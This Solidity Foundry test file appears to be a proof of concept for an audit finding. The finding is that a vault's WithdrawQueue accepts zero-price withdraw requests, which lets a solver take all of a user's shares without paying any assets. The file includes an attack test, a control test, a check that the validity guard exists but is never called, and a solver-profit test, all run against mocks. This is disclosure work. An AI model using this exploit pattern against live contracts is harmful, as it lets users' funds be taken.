// SPDX-License-Identifier: Apache-2.0
pragma solidity 0.8.21;

import { Test, console } from "forge-std/Test.sol";
import { ERC4626 } from "@solmate/mixins/ERC4626.sol";
import { WithdrawQueue } from "../src/modules/withdraw-queue/WithdrawQueue.sol";
import { MockAsset } from "../src/mocks/MockAsset.sol";
import { MockCellar } from "../src/mocks/MockCellar.sol";
import { MockSolver } from "../src/mocks/MockSolver.sol";

/// @title S5-L0 PoC — fail-to-zero price feed → 0-price withdraw request
/// @notice Proves ONLY the contract half of the finding, on verbatim
/// WithdrawQueue.sol (cellar-contracts HEAD 07efdfa):
///   * updateWithdrawRequest() accepts executionSharePrice == 0 with no
///     validation (its NatSpec says such a request "can be made, and solved"
///     and the user will be "selling their shares for no assets in return").
///   * solve() then pays shares * 0 == 0 assets while transferring ALL of
///     the user's shares to the solver.
/// The frontend half (price API returning "0" on every failure, legacy
/// WithdrawQueueForm submitting price 0 with no > 0 check) is NOT executed
/// here — it is reproduced by submitting exactly the request the frontend
/// submits: updateWithdrawRequest([cellar, [deadline, 0, shares, false]]).
contract ZeroPriceWithdrawTest is Test {
    WithdrawQueue public queue;
    MockAsset public asset;
    MockCellar public share;
    MockSolver public solver;

    address public user = makeAddr("user");
    address public solverEOA = makeAddr("solverEOA");

    uint256 public constant SHARES = 100 ether; // 100 shares, 18 decimals
    uint256 public constant CORRECT_PRICE = 1 ether; // 1.0 asset per share
    uint64 public deadline;

    function setUp() public {
        asset = new MockAsset();
        share = new MockCellar(asset);
        queue = new WithdrawQueue();
        solver = new MockSolver(asset, address(queue));
        deadline = uint64(block.timestamp + 1 days);

        // User: 100 assets -> deposit 1:1 -> 100 shares (worth ~100 assets).
        asset.mint(user, SHARES);
        vm.startPrank(user);
        asset.approve(address(share), SHARES);
        share.deposit(SHARES, user);
        // User approves the queue to pull the shares, as the real flow does.
        share.approve(address(queue), SHARES);
        vm.stopPrank();

        // Solver: pre-funded with ample assets so the control test can pay.
        asset.mint(address(solver), 1_000 ether);

        assertEq(share.balanceOf(user), SHARES, "setup: user shares");
        assertEq(share.previewRedeem(SHARES), SHARES, "setup: shares worth 100 assets");
    }

    /// @notice Helper: submit a withdraw request exactly as the legacy
    /// frontend does — [deadline, executionSharePrice, shares, false].
    function _submitRequest(uint88 price) internal {
        WithdrawQueue.WithdrawRequest memory req = WithdrawQueue.WithdrawRequest({
            deadline: deadline,
            executionSharePrice: price,
            sharesToWithdraw: uint96(SHARES),
            inSolve: false
        });
        vm.prank(user);
        queue.updateWithdrawRequest(share, req);
    }

    /// @notice Helper: run solve() for the single user, solver = MockSolver.
    function _solve() internal {
        address[] memory users = new address[](1);
        users[0] = user;
        queue.solve(share, users, bytes(""), address(solver));
    }

    // ============================ TEST 1 — ATTACK ============================

    /// @notice executionSharePrice == 0 (the value the frontend submits when
    /// the price API fails): user must receive 0 assets and lose all shares.
    function test1_ZeroPriceRequest_LosesEverything() public {
        _submitRequest(0); // <-- frontend's fail-to-zero value

        uint256 userAssetBefore = asset.balanceOf(user);
        uint256 solverSharesBefore = share.balanceOf(address(solver));

        _solve();

        uint256 userAssetsReceived = asset.balanceOf(user) - userAssetBefore;
        uint256 userSharesAfter = share.balanceOf(user);
        uint256 solverSharesAfter = share.balanceOf(address(solver));

        console.log("attack: user assets received:", userAssetsReceived);
        console.log("attack: user shares after:   ", userSharesAfter);
        console.log("attack: solver shares after: ", solverSharesAfter);
        uint256 lossPct = ((SHARES - userSharesAfter) * 100) / SHARES;
        console.log("attack: loss % of position:  ", lossPct);

        assertEq(userAssetsReceived, 0, "user must receive 0 assets");
        assertEq(userSharesAfter, 0, "user must lose all shares");
        assertEq(
            solverSharesAfter - solverSharesBefore,
            SHARES,
            "solver must receive all 100 shares"
        );
        assertEq(lossPct, 100, "loss must be 100% of position");
        // Request is consumed by the solve.
        assertEq(queue.getUserWithdrawRequest(user, share).sharesToWithdraw, 0);
    }

    // ============================ TEST 2 — CONTROL ============================

    /// @notice Same flow, correct price (1e18 == 1.0 asset/share): user must
    /// receive ~100 assets. Proves the zero price — not queue mechanics —
    /// causes the loss in Test 1.
    function test2_CorrectPriceRequest_PaysInFull() public {
        _submitRequest(uint88(CORRECT_PRICE));

        uint256 userAssetBefore = asset.balanceOf(user);

        _solve();

        uint256 userAssetsReceived = asset.balanceOf(user) - userAssetBefore;

        console.log("control: user assets received:", userAssetsReceived);
        console.log("control: user shares after:   ", share.balanceOf(user));
        console.log("control: solver shares after: ", share.balanceOf(address(solver)));

        assertEq(userAssetsReceived, SHARES, "user must receive ~100 assets");
        assertEq(share.balanceOf(user), 0, "user shares spent");
        assertEq(share.balanceOf(address(solver)), SHARES, "solver got the shares");
    }

    // ======================= TEST 3 — GUARD EXISTS, UNUSED =======================

    /// @notice isWithdrawRequestValid() returns false for the 0-price request
    /// (and true for the identical request at the correct price) — the guard
    /// exists in the contract but the frontend never calls it, and
    /// updateWithdrawRequest() never calls it either.
    function test3_ValidityGuardFlagsZeroPriceButIsNeverCalled() public {
        WithdrawQueue.WithdrawRequest memory zeroPrice = WithdrawQueue.WithdrawRequest({
            deadline: deadline,
            executionSharePrice: 0,
            sharesToWithdraw: uint96(SHARES),
            inSolve: false
        });
        WithdrawQueue.WithdrawRequest memory fairPrice = WithdrawQueue.WithdrawRequest({
            deadline: deadline,
            executionSharePrice: uint88(CORRECT_PRICE),
            sharesToWithdraw: uint96(SHARES),
            inSolve: false
        });

        // The guard correctly flags the dangerous request...
        assertFalse(
            queue.isWithdrawRequestValid(share, user, zeroPrice),
            "guard must return false for price 0"
        );
        // ...and passes the identical request at a fair price.
        assertTrue(
            queue.isWithdrawRequestValid(share, user, fairPrice),
            "guard must return true for correct price"
        );

        // ...yet updateWithdrawRequest() accepts the flagged request anyway:
        // no revert, request stored verbatim with price 0.
        vm.prank(user);
        queue.updateWithdrawRequest(share, zeroPrice);
        WithdrawQueue.WithdrawRequest memory stored = queue.getUserWithdrawRequest(user, share);
        assertEq(stored.executionSharePrice, 0, "0-price request stored");
        assertEq(stored.sharesToWithdraw, SHARES, "shares stored");
    }

    // ==================== TEST 4 (EXTRA) — SOLVER PROFIT ====================

    /// @notice Extra: after the 0-price solve the solver can redeem the
    /// stolen shares from the vault for their full ~100-asset value — the
    /// loss is a real transfer of value, not a burn.
    function test4_SolverRedeemsStolenSharesForFullValue() public {
        _submitRequest(0);
        _solve();
        assertEq(share.balanceOf(address(solver)), SHARES);

        uint256 solverAssetBefore = asset.balanceOf(address(solver));
        vm.prank(address(solver));
        uint256 redeemed = share.redeem(SHARES, address(solver), address(solver));

        console.log("extra: solver redeemed assets:", redeemed);
        assertEq(redeemed, SHARES, "stolen shares redeem for ~100 assets");
        assertEq(asset.balanceOf(address(solver)) - solverAssetBefore, SHARES);
    }
}
